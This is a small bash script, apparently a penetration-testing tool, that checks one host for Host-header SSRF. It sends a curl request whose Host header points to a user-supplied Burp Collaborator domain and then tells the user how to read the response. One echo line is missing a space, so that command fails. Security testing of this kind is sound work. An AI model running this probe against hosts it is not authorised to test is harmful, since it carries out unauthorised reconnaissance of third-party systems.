#!/bin/bash
# MaHost-single v1.0
# Coded by kaiz3n

echo
echo
echo "  __  __       _   _           _            _             _              _   ___   "
echo " |  \/  | __ _| | | | ___  ___| |_      ___(_)_ __   __ _| | ___  __   _/ | / _ \  "
echo " | |\/| |/ _' | |_| |/ _ \/ __| __|____/ __| | '_ \ / _' | |/ _ \ \ \ / / || | | | "
echo " | |  | | (_| |  _  | (_) \__ \ ||_____\__ \ | | | | (_| | |  __/  \ V /| || |_| | "
echo " |_|  |_|\__'_|_| |_|\___/|___/\__|    |___/_|_| |_|\__, |_|\___|   \_/ |_(_)___/  "
echo "                                                   |___/                           "
echo
echo
echo "This is MaHost-single v1.0 - Test a single host if its vulnerable to Host Header SSRF Attack via Burp Collaborator + Curl"
echo
echo "Please enter the host to test for Host Header injection: (https://some.domain.com) "; read host
echo "Please enter your Burp Collaborator URL where you will receive requests: "; read burpcollaborator
echo
echo
echo "------------------------------------------------------------------------"
curl -s -X GET -H "Host: ${burpcollaborator}" ${host} -I -L
echo "------------------------------------------------------------------------"
echo
echo
echo "Let's see if it worked! Your response should have the following header: "
echo
echo "------------------------------------------------------------------------"
echo "**** Server: Burp Collaborator https://burpcollaborator.net/ ****"
echo"-------------------------------------------------------------------------"
echo
echo "If it does = SUCCESS (Check Burp Collaborator client for request); if it doesn't TRY AGAIN!"

